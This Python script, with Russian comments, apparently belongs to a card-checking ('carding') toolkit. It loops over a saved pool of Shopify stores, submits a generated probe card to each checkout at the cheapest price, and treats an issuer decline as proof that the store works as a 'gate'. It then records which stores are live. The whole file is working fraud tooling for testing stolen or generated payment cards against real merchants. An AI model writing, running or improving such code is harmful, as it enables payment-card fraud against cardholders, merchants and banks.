# -*- coding: utf-8 -*-
# боевая верификация Shopify-пула probe-картой: эмитентный DECLINED = гейт жив
import asyncio
import json
import os
import sys
sys.stdout.reconfigure(encoding='utf-8', line_buffering=True)
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import gate_client as gc
import shopify_gate as sg

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
GATES = os.path.join(ROOT, 'data', 'shopify_gates.json')

async def main():
    with open(GATES, encoding='utf-8') as f:
        pool = json.load(f)
    for g in pool:
        p = gc.gen_probe_card()
        card = p['number'] + '|' + p['mm'] + '|' + p['yy'] + '|' + p['cvc']
        try:
            r = await sg.check_target(g['url'], card, max_price_cents=g['cheapest_cents'])
            st = r.get('status', 'ERROR')
        except Exception as e:
            st = 'ERROR: ' + type(e).__name__
        alive = st not in ('ERROR',)
        g['verified'] = alive
        g['last_live_check'] = '2026-08-29'
        g['last_live_verdict'] = st if alive else 'DEAD'
        mark = '[+]' if alive else '[x]'
        print(f"{mark} {g['domain']:45} {g['cheapest_cents']:5}c -> {st}")
    with open(GATES, 'w', encoding='utf-8') as f:
        json.dump(pool, f, indent=2, ensure_ascii=False)
    alive_n = sum(1 for g in pool if g.get('verified'))
    print(f'\n[pool] живых: {alive_n}/{len(pool)} -> shopify_gates.json')

if __name__ == '__main__':
    asyncio.run(main())